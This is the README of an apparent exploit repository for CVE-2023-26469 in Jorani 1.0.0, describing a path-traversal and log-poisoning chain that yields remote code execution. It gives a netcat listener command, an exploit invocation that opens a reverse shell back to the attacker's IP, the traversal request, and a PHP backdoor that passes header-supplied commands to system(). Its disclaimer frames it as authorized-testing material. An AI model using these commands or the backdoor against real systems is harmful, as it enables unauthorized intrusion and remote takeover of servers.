# Jorani 1.0.0 Exploit (CVE-2023-26469)

**Unrestricted File Upload → Remote Code Execution Exploit**

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/downloads/)

**Disclaimer**: This tool is for educational and authorized testing purposes only. Misuse of this software is prohibited. The developers assume no liability for damage caused through improper use.

## Table of Contents
- [Description](#description)
- [Vulnerable Versions](#vulnerable-versions)
- [Installation](#installation)
- [Usage](#usage)
- [Technical Details](#technical-details)
- [References](#references)

## Description
This exploit targets a critical vulnerability chain in Jorani v1.0.0 that combines:
1. **Path Traversal** in language parameter
2. **Unrestricted File Upload** leading to Remote Code Execution

The exploit works by poisoning application logs with PHP code and triggering execution through manipulated HTTP headers.

**Credits**:
- Original vulnerability discovery: [@jrjgjk (Guilhem RIOUX)](https://github.com/jrjgjk)
- Exploit adaptation: Samip Mainali

## Vulnerable Versions
Confirmed vulnerable version:
- **Jorani 1.0.0**

Other potentially affected versions (untested):
- Tested on Version 1.0.0 (based on CVE-2023-26469 details)

## Installation
1. Clone repository:
bash
git clone https://github.com/<your-username>/jorani-exploit.git
cd jorani-exploit

Requirements:

Python 3.8+
Requests library
Usage

Start netcat listener:
bash
Copy
nc -lvnp 4444
Run exploit:
bash
Copy
python3 exploit.py -u http://target:port -i YOUR_IP -p LISTENER_PORT
Example:

bash
Copy
python3 exploit.py -u http://192.168.1.100:8080 -i 10.10.14.5 -p 4444
Features:

Automatic protocol detection (HTTP/HTTPS)
Randomized header injection
Connection stability checks
Detailed error diagnostics
Troubleshooting:

If connection fails, verify:
Target URL accessibility
Listener configuration
Firewall rules
Protocol compatibility (HTTP vs HTTPS)
Technical Details

Vulnerability Chain

Log Poisoning:
Path traversal in language parameter allows writing PHP files to log directory
http
Copy
POST /session/login HTTP/1.1
language=../../application/logs
Header-Based Code Execution:
php
Copy
<?php 
if(isset($_SERVER["HTTP_X_CUSTOM_HEADER"])){
    system(base64_decode($_SERVER["HTTP_X_CUSTOM_HEADER"]));
}
Exploit Workflow

CSRF token extraction
Log file poisoning with PHP backdoor
Reverse shell triggering via custom header
Connection stability verification
Key Features

Randomized HTTP header names for each execution
Automatic protocol detection and validation
Connection timeout handling
Color-coded status output
References

CVE-2023-26469 Advisory
Original Research by Guilhem RIOUX

Legal Notice
This software is provided "as-is" without any warranty. Users are solely responsible for ensuring they have proper authorization to test systems using this tool. The developers disclaim all liability for unauthorized or malicious use.
